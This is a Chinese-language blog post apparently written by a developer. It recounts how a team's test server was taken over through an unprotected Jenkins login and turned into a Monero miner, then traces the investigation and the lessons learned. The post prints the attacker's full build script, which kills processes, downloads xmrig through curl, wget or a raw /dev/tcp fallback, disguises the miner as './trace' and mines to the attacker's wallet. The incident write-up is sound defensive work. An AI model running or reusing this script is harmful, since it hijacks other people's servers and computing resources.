以此篇Blog纪念服务器第一次被hack，加强安全意识(排查过程挺好玩的).

#### 经过
Nov 18, 2019 1:03:00 PM，team的服务器被歹人劫持并在其命令下沦为了一台被没日没夜压榨的辛苦矿工，在我与Jerry的共同努力下顺着线索层层排查，终于找到了矿工所在地，并成功营救出矿工。以下为详细侦查经过。

2019年11月18日下午3点左右，资深工程师Jerry在使用服务器时猛然发觉异样，于是使用top指令查看发现CPU使用率居然维持在惊人的791.4%，并指出这是一个id为2220的线程使用的，而该线程明显不是我们自己启动的

![](https://user-images.githubusercontent.com/37465243/69053079-89d8e100-0a43-11ea-96b5-7396c63805d6.png)
于是马上通知了我这一异样，在排除掉小数点显示错位这一可能性后，开始详细排查原因。

首先使用htop查看线程具体信息与启动指令，图片如下。该命令明显不像用户通过终端启动的，但由于启动命令的路径为相对路径，相对路径名称./trace明显不是一个程序，因此进一步的

![](https://user-images.githubusercontent.com/37465243/69052920-336ba280-0a43-11ea-8b98-3fe33f859437.png)

使用`ll /proc/PID`指令查看启动命令的绝对路径信息：

![](https://user-images.githubusercontent.com/37465243/69052921-336ba280-0a43-11ea-84a8-11b8bd6eabfe.png)

此处看到了一个我们熟悉的关键词，Jenkins，于是登录Jenkins发现里面被人创建了一个名为Updating的workspace，且其一直处于build状态.

![](https://user-images.githubusercontent.com/37465243/69052924-34043900-0a43-11ea-866f-a30b6fce3ddd.png)

打开配置文件，在build脚本中，我们找到了其究竟对服务器做了什么(后续分析)

![](https://user-images.githubusercontent.com/37465243/69052925-34043900-0a43-11ea-8248-dbf06ebe1a54.png)

此时只需要禁用该workspace，并关闭已启动的进程即可，服务器就此恢复正常。

![](https://user-images.githubusercontent.com/37465243/69052927-349ccf80-0a43-11ea-94b5-23551128a556.png)

#### 分析
回头复盘一下发现，整个安全事件的根本原因在于Jenkins的没有设置密码验证机制，密码输入错误后可以马上无间断的再次输入，且没有输入次数限制，该安全隐患在安装Jenkins之处的时候就已经发现了，但是当时没有处理，因此给hacker暴力破解提供了可能性，剩下的就简单多了，hacker暴力破解后，创建了一个workspace，并编写build脚本，并在服务器上安装挖矿程序，然后推出。比较可惜的是，挖矿程序只执行了不到4小时就被关停了。

更进一步的我想通过Jenkins的脚本想尝试追踪一下这个hacker的信息，但发现难度很大，在脚本中还有两个有用的线索：

* https://github.com/xmrig/xmrig/releases/download/v5.0.0/xmrig-5.0.0-xenial-x64.tar.gz
* --user 46sfbbM3XSjBo54d5a8PYUU5yQ31x6Rpv6tBhe22Cd7VYeJUyFUhzBF5rTf1oTB1d8MqgHxX5RbbEEKZd8fBAAmcFfv9Y5c

前者是挖矿工具的github地址，是一个公共工具，仓库所有者不可能是hacker，
至于第二条信息，一个标准的区块链账号，而区块链账号的特征之一就是匿名，无法通过账号锁定账号持有者，所以几乎没有查找到所有人的可能性。
下一步准备看一下Jenkins的登录日志是有有IP信息，但也不抱有特别大的希望，这里就把hacker的区块链账号明文贴出来不打码了～～

完整脚本如下：
```sh
#!/bin/bash
if [[ $(whoami) != "root" ]]; then
    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
        kill -9 $tr || : ;
    done;
fi

threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

rm -rf config.json;

d () {
	curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
}

test ! -s trace && \
    d https://github.com/xmrig/xmrig/releases/download/v5.0.0/xmrig-5.0.0-xenial-x64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-5.0.0/xmrig trace && \
    rm -rf xmrig-5.0.0 && \
    rm -rf trace.tgz;

test ! -x trace && chmod +x trace;

k() {
    ./trace \
        -r 2 \
        -R 2 \
        --keepalive \
        --no-color \
        --donate-level 1 \
        --max-cpu-usage 80 \
        --cpu-priority 3 \
        --print-time 25 \
        --threads ${threadCount:-4} \
        --url $1 \
        --user 46sfbbM3XSjBo54d5a8PYUU5yQ31x6Rpv6tBhe22Cd7VYeJUyFUhzBF5rTf1oTB1d8MqgHxX5RbbEEKZd8fBAAmcFfv9Y5c \
        --pass x \
        --coin xmr \
        --keepalive
}

k xmr-eu1.nanopool.org:14444 || k xmr-eu2.nanopool.org:14444 || k xmr-us-east1.nanopool.org:14444 || k xmr-us-west1.nanopool.org:14444 || k xmr-asia1.nanopool.org:14444 || k xmr-jp1.nanopool.org:14444
```

#### 后记
在被hack之后在网上也找到了不少其他的类似的案例，Win和linux系统都有，hack的渠道也多种多样，还是要对hacker的技术涉猎面表示一下佩服。

准确讲这并不算一个病毒，只是别人利用密码验证机制的漏洞，通过Jenkins在服务器上部署了一个占用资源非常庞大的应用程序，客观的说这个应用程序对系统也是无害的，但从安全角度上讲，kacker是有能力通过这一漏洞对系统进行破坏的，所幸的是这是一个测试服务器，不会带来直接的经济损失，但此处被hack的经历，确实暴漏出我对服务器安全的不重视，算是一次没有“花钱”买的教训。

